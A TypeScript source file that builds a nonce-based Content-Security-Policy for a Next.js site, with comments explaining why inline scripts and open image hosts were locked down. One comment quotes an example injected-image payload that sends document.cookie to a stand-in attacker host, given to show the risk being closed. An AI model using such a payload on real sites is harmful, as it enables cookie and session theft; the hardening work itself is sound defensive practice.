/**
 * csp.ts — the Content-Security-Policy, built per request so it can carry a
 * nonce.
 *
 * WHY A NONCE: the previous policy shipped `script-src 'self' 'unsafe-inline'`,
 * which stops nothing — with `'unsafe-inline'` present and no nonce, any
 * injected `<script>` executes and the directive is decorative (audit
 * 2026-09-01). A per-request nonce plus `'strict-dynamic'` makes script-src
 * real: only scripts carrying this request's nonce run, and the chunks they
 * load inherit trust, which is exactly how Next bootstraps.
 *
 * `style-src` KEEPS 'unsafe-inline' on purpose: Tailwind and React inject
 * style attributes/tags with no nonce hook, and style-only injection is a
 * vastly smaller problem than script execution. Removing it would break the
 * site for no meaningful gain.
 *
 * Edge-safe: no imports, so src/middleware.ts can use it.
 */

/** Origins allowed to iframe the embeddable tutorial widget. */
export const EMBED_FRAME_ANCESTORS =
  "frame-ancestors 'self' https://winnica.pl https://*.winnica.pl https://wine.icoffio.com https://wine2.icoffio.com";

/** Everything else must not be framed at all. */
export const SELF_FRAME_ANCESTORS = "frame-ancestors 'self'";

/**
 * Image hosts we actually use. The old policy said `img-src https:`, i.e. ANY
 * https host — which doubles as an open exfiltration channel for injected
 * markup (`<img src="https://attacker/?c="+document.cookie>`). These five are
 * the hosts in next.config's remotePatterns plus the Mapbox tiles.
 */
const IMG_SRC = [
  "'self'",
  "data:",
  "blob:",
  "https://winnica.pl",
  "https://images.unsplash.com",
  "https://upload.wikimedia.org",
  "https://lh3.googleusercontent.com",
  "https://api.qrserver.com",
  "https://api.mapbox.com",
  "https://*.tiles.mapbox.com",
].join(" ");

export function buildCsp(opts: {
  nonce: string;
  frameAncestors: string;
  isDev: boolean;
}): string {
  const { nonce, frameAncestors, isDev } = opts;
  return [
    "default-src 'self'",
    "base-uri 'self'",
    "object-src 'none'",
    "form-action 'self'",
    `img-src ${IMG_SRC}`,
    // Google Fonts: stylesheet from fonts.googleapis.com, files from gstatic.
    "font-src 'self' data: https://fonts.gstatic.com",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    // 'strict-dynamic' lets the nonced bootstrap load Next's chunks. Dev also
    // needs 'unsafe-eval' for webpack's eval source maps.
    `script-src 'nonce-${nonce}' 'strict-dynamic' 'self'${isDev ? " 'unsafe-eval'" : ""}`,
    "connect-src 'self' https://api.mapbox.com https://events.mapbox.com",
    "worker-src 'self' blob:",
    frameAncestors,
  ].join("; ");
}

/** 128 bits of randomness, base64 — regenerated for every request. */
export function makeNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let s = "";
  for (const b of bytes) s += String.fromCharCode(b);
  return btoa(s);
}
